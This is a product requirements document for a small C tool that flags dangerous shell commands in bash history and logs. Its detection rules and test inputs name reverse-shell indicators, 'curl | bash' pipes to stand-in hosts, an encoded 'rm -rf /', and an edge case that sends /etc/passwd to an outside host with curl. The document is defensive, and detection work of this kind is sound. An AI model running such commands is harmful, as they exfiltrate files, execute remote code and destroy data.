# Suspicious Command Detector (SCD)
### Product Requirements Document — Unix/C Systems Project

---

## Table of Contents

1. [Overview](#overview)
2. [Problem Statement](#problem-statement)
3. [Goals & Non-Goals](#goals--non-goals)
4. [System Architecture](#system-architecture)
5. [Core Modules](#core-modules)
6. [Detection Rules](#detection-rules)
7. [Functional Requirements](#functional-requirements)
8. [Non-Functional Requirements](#non-functional-requirements)
9. [CLI Interface](#cli-interface)
10. [Project File Structure](#project-file-structure)
11. [Docker Setup](#docker-setup)
12. [Milestones](#milestones)
13. [Testing Strategy](#testing-strategy)
14. [Future Enhancements](#future-enhancements)

---

## Overview

**Project Name:** Suspicious Command Detector (SCD)
**Language:** C (POSIX C99/C11)
**Target Platform:** Linux (primary), macOS (secondary)
**Type:** CLI security utility / background daemon

SCD is a Unix-based command-line tool written in C that monitors and inspects shell commands — either in real-time or from shell history/log files — and flags potentially dangerous or suspicious patterns. It is designed as a lightweight security utility that can run as a one-shot scanner or as a persistent background daemon.

---

## Problem Statement

Malicious or accidental destructive commands — privilege escalation, recursive file deletion, network exfiltration, reverse shells — often leave traces in shell history or process tables. Existing solutions are either too heavy (full SIEM systems), Python-dependent, or not designed for quick triage in minimal environments.

**SCD solves this by:**
- Parsing raw command strings using pattern matching in C
- Scoring them by risk level using a configurable ruleset
- Outputting structured alerts with zero external dependencies

---

## Goals & Non-Goals

### Goals
- Detect suspicious shell commands from history files, log files, or stdin
- Support real-time monitoring via `inotify` (Linux)
- Produce structured alerts (plain text and JSON)
- Be configurable without recompilation (external rules config)
- Run as a background daemon
- Compile and run inside Docker with zero host dependencies

### Non-Goals
- SCD does **not** block or kill processes (read-only tool)
- SCD does **not** replace a full SIEM or EDR solution
- SCD does **not** perform network-level monitoring
- SCD does **not** require root privileges to run

---

## System Architecture

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────┐     ┌──────────────┐
│ Input Source │ --> │    Parser    │ --> │ Rule Engine │ --> │  Scorer  │ --> │ Alert Output │
└─────────────┘     └──────────────┘     └─────────────┘     └──────────┘     └──────────────┘
     │                                          ↑
     │                                   ┌──────────────┐
     │                                   │  rules.conf  │
     └─── file / stdin / inotify watch   └──────────────┘
```

### Data Flow

1. **Input Reader** reads commands line-by-line from the source
2. **Parser** tokenizes each command line, handling pipes, redirects, subshells, and escape sequences
3. **Rule Engine** loads rules from `rules.conf` and matches tokens against each rule pattern
4. **Scorer** aggregates matched rules and assigns a numeric risk score
5. **Alert Output** formats and writes the result to stdout, a log file, or syslog

---

## Core Modules

### `input_reader.c`
- Reads from `.bash_history`, a custom log file, or stdin
- Supports live tail via `inotify_add_watch()` on Linux
- Handles EOF gracefully and supports re-read on file rotation

### `parser.c`
- Tokenizes each command line
- Handles:
  - Pipes (`|`)
  - Redirects (`>`, `>>`, `2>&1`)
  - Subshells (`$(...)`, `` `...` ``)
  - Environment variable expansions
  - Quoted strings and escape sequences
- Returns a `ParsedCommand` struct with token list

### `rule_engine.c`
- Loads rules from external config file at startup
- Each rule has: `id`, `pattern`, `risk_level`, `description`
- Supports substring match, prefix match, and regex-like wildcards
- Returns list of matched rules for a given parsed command

### `scorer.c`
- Aggregates matched rule risk levels
- Scoring table:

| Risk Level | Base Score |
|------------|------------|
| CRITICAL   | 100        |
| HIGH       | 70         |
| MEDIUM     | 40         |
| LOW        | 15         |

- Combined score = sum of individual rule scores (capped at 100)
- Score thresholds: `0–20` → clean, `21–50` → suspicious, `51+` → dangerous

### `alert.c`
- Formats output in plain text or JSON
- Alert fields: `timestamp`, `command`, `matched_rules[]`, `risk_score`, `risk_level`, `reason`
- Supports write to: stdout, log file, or syslog via `openlog()`

### `daemon.c`
- Forks to background using `fork()` + `setsid()`
- Writes PID to `/var/run/scd.pid`
- Redirects stdin/stdout/stderr to `/dev/null`
- Registers signal handlers for `SIGTERM` and `SIGHUP` (config reload)

---

## Detection Rules

Rules are loaded from `config/rules.conf`. Format per rule:

```
RULE_ID | RISK_LEVEL | PATTERN | DESCRIPTION
```

### Default Ruleset

| Rule ID | Risk      | Pattern / Trigger                              | Description                        |
|---------|-----------|------------------------------------------------|------------------------------------|
| R-01    | HIGH      | `sudo su`, `sudo -i`, `su -`, `sudo bash`      | Privilege escalation attempt       |
| R-02    | CRITICAL  | `rm -rf /`, `rm -rf /*`, `rm -rf ~`            | Recursive root/home deletion       |
| R-03    | HIGH      | `chmod 777` on `/etc`, `/bin`, `/usr`          | Broad permission grant on sys dirs |
| R-04    | HIGH      | `curl ... | bash`, `wget ... | sh`             | Remote code execution via pipe     |
| R-05    | CRITICAL  | `nc -e`, `/dev/tcp`, `bash -i`                 | Reverse shell indicator            |
| R-06    | MEDIUM    | writes to `/etc/cron*`, `~/.bashrc`, `~/.profile` | Persistence mechanism           |
| R-07    | MEDIUM    | `base64 -d | bash`, hex-encoded payloads       | Obfuscated command execution       |
| R-08    | LOW       | `unset HISTFILE`, `history -c`, `export HISTFILESIZE=0` | History evasion           |
| R-09    | HIGH      | `chown root`, `chattr +i`, `visudo`            | Privileged file manipulation       |
| R-10    | MEDIUM    | `kill -9` bursts, `pkill -f`                   | Aggressive process termination     |

### `rules.conf` Format Example

```
# SCD Rules Configuration
# Format: ID|RISK|PATTERN|DESCRIPTION

R-01|HIGH|sudo su|Privilege escalation - sudo to root shell
R-02|CRITICAL|rm -rf /|Recursive deletion of root filesystem
R-04|HIGH|| bash|Remote code execution via pipe to bash
R-05|CRITICAL|/dev/tcp|Reverse shell using /dev/tcp
R-08|LOW|unset HISTFILE|History file evasion
```

---

## Functional Requirements

| ID    | Requirement                                                                 | Priority |
|-------|-----------------------------------------------------------------------------|----------|
| FR-01 | Accept input via: file path argument, stdin pipe, inotify live watch        | Must     |
| FR-02 | Load detection rules from external `rules.conf` without recompile           | Must     |
| FR-03 | Output alert with: timestamp, rule ID, command, risk score, reason          | Must     |
| FR-04 | Support plain-text and JSON output via `-f` flag                            | Should   |
| FR-05 | Daemon mode with `-d` flag: fork to background, PID file, syslog output     | Should   |
| FR-06 | Whitelist support: skip known-safe patterns from `whitelist.conf`           | Nice     |
| FR-07 | Exit with non-zero code if any CRITICAL-level commands are found            | Must     |
| FR-08 | `-v` verbose mode: print every scanned command, not just flagged ones       | Nice     |
| FR-09 | Config reload on `SIGHUP` without restart (daemon mode)                     | Nice     |

---

## Non-Functional Requirements

| Category    | Requirement                                                                 |
|-------------|-----------------------------------------------------------------------------|
| Performance | Process ≥ 10,000 command lines/sec on a single core                        |
| Memory      | Footprint < 4 MB. No dynamic allocation in the hot scan path               |
| Portability | Compiles with `gcc -Wall -Wextra -pedantic`. Targets POSIX.1-2008          |
| Safety      | No system calls that modify state. Read-only access to monitored files      |
| Build       | Single `Makefile`. Zero third-party dependencies. Produces one static binary|
| Logging     | Timestamped log entries. Log rotation awareness (re-open on `SIGHUP`)      |

---

## CLI Interface

```
Usage: scd [OPTIONS] [FILE]

Arguments:
  FILE                  Path to history/log file to scan (omit to read from stdin)

Options:
  -f <format>           Output format: text (default) | json
  -r <rules>            Path to rules config (default: ./config/rules.conf)
  -w <whitelist>        Path to whitelist file
  -l <logfile>          Write alerts to logfile instead of stdout
  -d                    Run as daemon, watch FILE continuously via inotify
  -v                    Verbose: show all scanned commands, not just flagged
  -t <threshold>        Minimum risk score to report (default: 20)
  -h                    Show help
  --version             Show version
```

### Example Usage

```bash
# Scan bash history file
scd ~/.bash_history

# Scan with JSON output
scd -f json ~/.bash_history

# Live watch a log file as a daemon
scd -d -l /var/log/scd.log /var/log/syslog

# Pipe commands in from another process
cat commands.txt | scd -f json

# Use custom rules file with higher threshold
scd -r /etc/scd/rules.conf -t 50 ~/.bash_history
```

---

## Project File Structure

```
scd/
├── src/
│   ├── main.c              ← Entry point, argument parsing, mode dispatch
│   ├── input_reader.c      ← File / stdin / inotify reader
│   ├── input_reader.h
│   ├── parser.c            ← Command tokenizer
│   ├── parser.h
│   ├── rule_engine.c       ← Rule loader and pattern matcher
│   ├── rule_engine.h
│   ├── scorer.c            ← Risk score aggregator
│   ├── scorer.h
│   ├── alert.c             ← Output formatter (text/JSON/syslog)
│   ├── alert.h
│   ├── daemon.c            ← fork/setsid/pidfile/signal handlers
│   └── daemon.h
├── include/
│   └── scd.h               ← Shared structs, enums, defines
├── config/
│   ├── rules.conf          ← Default detection ruleset
│   └── whitelist.conf      ← Safe pattern exceptions
├── tests/
│   ├── test_parser.sh      ← Parser unit tests
│   ├── test_rules.sh       ← Rule matching tests
│   ├── test_scoring.sh     ← Score threshold tests
│   ├── sample_clean.txt    ← Sample safe command history
│   └── sample_malicious.txt← Sample flagged command history
├── docker/
│   ├── Dockerfile          ← Build + run container
│   └── docker-compose.yml  ← Multi-service compose setup
├── Makefile
├── README.md
└── .gitignore
```

---

## Docker Setup

Docker allows you to build and run SCD without installing any C toolchain on your host machine.

### `Dockerfile`

```dockerfile
# Stage 1: Build
FROM gcc:13-bookworm AS builder

WORKDIR /app

# Copy source files
COPY src/ ./src/
COPY include/ ./include/
COPY config/ ./config/
COPY Makefile .

# Build the binary
RUN make all

# Stage 2: Minimal runtime image
FROM debian:bookworm-slim AS runtime

WORKDIR /app

# Copy compiled binary and config
COPY --from=builder /app/scd ./scd
COPY --from=builder /app/config ./config

# Default: show help
ENTRYPOINT ["./scd"]
CMD ["--help"]
```

### `docker-compose.yml`

```yaml
version: "3.9"

services:

  # One-shot scan of a history file
  scd-scan:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    container_name: scd-scan
    volumes:
      - ${HOME}/.bash_history:/data/bash_history:ro
      - ./config:/app/config:ro
    command: ["-f", "json", "-r", "/app/config/rules.conf", "/data/bash_history"]

  # Daemon mode: continuously watch a log file
  scd-daemon:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    container_name: scd-daemon
    restart: unless-stopped
    volumes:
      - /var/log:/var/log:ro
      - ./config:/app/config:ro
      - ./logs:/app/logs
    command: ["-d", "-l", "/app/logs/scd.log", "-r", "/app/config/rules.conf", "/var/log/syslog"]
```

### `Makefile`

```makefile
CC       = gcc
CFLAGS   = -Wall -Wextra -pedantic -std=c11 -O2
LDFLAGS  =
SRC_DIR  = src
INC_DIR  = include
BUILD_DIR= build

SRCS     = $(wildcard $(SRC_DIR)/*.c)
OBJS     = $(SRCS:$(SRC_DIR)/%.c=$(BUILD_DIR)/%.o)
TARGET   = scd

.PHONY: all clean test docker-build docker-run

all: $(BUILD_DIR) $(TARGET)

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

$(TARGET): $(OBJS)
	$(CC) $(LDFLAGS) -o $@ $^

$(BUILD_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -I$(INC_DIR) -c -o $@ $<

clean:
	rm -rf $(BUILD_DIR) $(TARGET)

test:
	@bash tests/test_parser.sh
	@bash tests/test_rules.sh
	@bash tests/test_scoring.sh

docker-build:
	docker build -f docker/Dockerfile -t scd:latest .

docker-run:
	docker run --rm -v ~/.bash_history:/data/bash_history:ro scd:latest \
	  -f json /data/bash_history

docker-compose-up:
	docker compose -f docker/docker-compose.yml up --build

docker-compose-down:
	docker compose -f docker/docker-compose.yml down
```

### Running with Docker — Quick Reference

```bash
# 1. Build the image
make docker-build
# or
docker build -f docker/Dockerfile -t scd:latest .

# 2. Scan your bash history (one-shot)
docker run --rm \
  -v ~/.bash_history:/data/bash_history:ro \
  scd:latest /data/bash_history

# 3. JSON output
docker run --rm \
  -v ~/.bash_history:/data/bash_history:ro \
  scd:latest -f json /data/bash_history

# 4. Pipe commands directly
echo "curl http://evil.com | bash" | docker run --rm -i scd:latest

# 5. Use custom rules file
docker run --rm \
  -v ~/.bash_history:/data/bash_history:ro \
  -v $(pwd)/config:/app/config:ro \
  scd:latest -r /app/config/rules.conf /data/bash_history

# 6. Run via docker compose (scan mode)
docker compose -f docker/docker-compose.yml run scd-scan

# 7. Run daemon mode via docker compose
docker compose -f docker/docker-compose.yml up scd-daemon
```

---

## Milestones

| Milestone | Deliverable                                                        | Target   |
|-----------|--------------------------------------------------------------------|----------|
| M1        | Working parser — tokenizes commands including pipes and redirects  | Week 1   |
| M2        | Rule engine — loads `rules.conf`, matches against test commands    | Week 2   |
| M3        | End-to-end scan of `.bash_history` with plain-text alert output    | Week 3   |
| M4        | JSON output mode + whitelist support + daemon mode (`-d`)          | Week 4   |
| M5        | inotify live watch + full test suite covering all 10 rule classes  | Week 5   |
| M6        | Docker image + Compose setup + README polished                     | Week 5-6 |

---

## Testing Strategy

### Unit Tests (shell scripts in `tests/`)

```bash
# test_parser.sh — verify tokenization
echo 'curl http://x.com | bash' | ./scd -v   # should flag R-04
echo 'ls -la /home'              | ./scd -v   # should be clean
echo 'rm -rf /'                  | ./scd -v   # should flag R-02 CRITICAL
```

### Test Data Files

- `tests/sample_clean.txt` — 50 normal everyday commands
- `tests/sample_malicious.txt` — 20 commands covering all 10 rule categories

### Edge Cases to Cover

- Commands with multiple pipes: `cat /etc/passwd | base64 | curl -d @- http://x.com`
- Obfuscated commands: `echo "cm0gLXJmIC8=" | base64 -d | bash`
- Commands split across history lines via backslash continuation
- Empty lines and comment lines in history files
- Commands with unicode characters

### Exit Code Contract

| Exit Code | Meaning                                 |
|-----------|-----------------------------------------|
| 0         | No suspicious commands found            |
| 1         | Suspicious commands found (score 21–50) |
| 2         | Dangerous commands found (score 51+)    |
| 3         | Runtime error (bad file, invalid config)|

---

## Future Enhancements

| Feature                  | Description                                                          |
|--------------------------|----------------------------------------------------------------------|
| **Regex rule support**   | Full POSIX regex matching in `rules.conf` instead of substring match |
| **User behavior baseline** | Learn normal patterns per user, flag deviations                   |
| **eBPF integration**     | Hook into kernel via eBPF for real-time syscall-level monitoring     |
| **Web dashboard**        | Small HTTP server exposing alerts as a JSON feed                     |
| **Slack/webhook alerts** | POST alerts to a webhook URL on CRITICAL matches                     |
| **rpm/deb package**      | Distribute as a proper system package with systemd service unit      |

---

*SCD — Suspicious Command Detector | v1.0 Scope | Unix/C Systems Project*
